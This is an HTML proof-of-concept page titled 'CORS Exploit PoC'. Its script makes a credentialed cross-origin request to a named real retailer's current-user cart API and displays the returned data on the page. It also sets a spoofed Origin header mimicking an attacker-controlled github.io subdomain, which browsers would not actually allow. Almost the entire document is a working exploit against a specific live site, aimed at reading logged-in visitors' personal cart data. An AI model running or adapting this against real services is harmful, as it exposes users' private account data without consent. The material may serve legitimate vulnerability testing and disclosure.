<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit PoC</h1>
    <p id="output">Fetching data...</p>
    <script>
        // Fetch API to test CORS with a manipulated Origin
        fetch("https://www.marionnaud.cz/api/v2/mcz/users/current/carts/current?fields=FULL&stocks=1&country=CZ&lang=cs_CZ", {
            method: "GET",
            credentials: "include",
            headers: {
                "Origin": "https://www.marionnaud.cz.stargazer0.github.io"
            }
        })
        .then(response => {
            if (response.ok) {
                return response.text();
            } else {
                throw new Error(`CORS request failed with status: ${response.status}`);
            }
        })
        .then(data => {
            document.getElementById("output").textContent = `Data received: ${data}`;
        })
        .catch(error => {
            document.getElementById("output").textContent = `Error: ${error.message}`;
        });
    </script>
</body>
</html>
